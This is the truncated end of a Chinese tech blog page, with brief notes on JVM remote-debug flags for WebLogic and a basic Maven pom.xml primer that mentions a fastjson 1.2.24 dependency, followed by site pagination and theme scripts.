<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005</span><br></pre></td></tr></table></figure>

<h3 id="对weblogic进行远程调试"><a href="#对weblogic进行远程调试" class="headerlink" title="对weblogic进行远程调试"></a>对weblogic进行远程调试</h3><h2 id="maven基础知识掌握"><a href="#maven基础知识掌握" class="headerlink" title="maven基础知识掌握"></a>maven基础知识掌握</h2><p>Maven是一个项目构建工具，采用Project Object Model概念来管理项目。</p>
<h3 id="1-pom-xml文件介绍"><a href="#1-pom-xml文件介绍" class="headerlink" title="1.pom.xml文件介绍"></a>1.pom.xml文件介绍</h3><p>该文件使用xml文件结构，用于管理源代码，配置文件，开发者的信息和角色，问题追踪系统，组织者信息，项目授权，项目的url，项目的依赖关系等。</p>
<p>maven项目中必须包含pom.xml文件。</p>
<h3 id="2-pom-xml定义依赖关系"><a href="#2-pom-xml定义依赖关系" class="headerlink" title="2.pom.xml定义依赖关系"></a>2.pom.xml定义依赖关系</h3><p>pom.xml文件中的dependencies和dependency用于定义依赖关系，</p>
<p>dependency通过groupId、artifactId、version来定义所依赖的项目。引入fastjson1.2.24版本组件的Maven配置信息</p>
<p>debugFlag=”true”<br>export debugFlag</p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>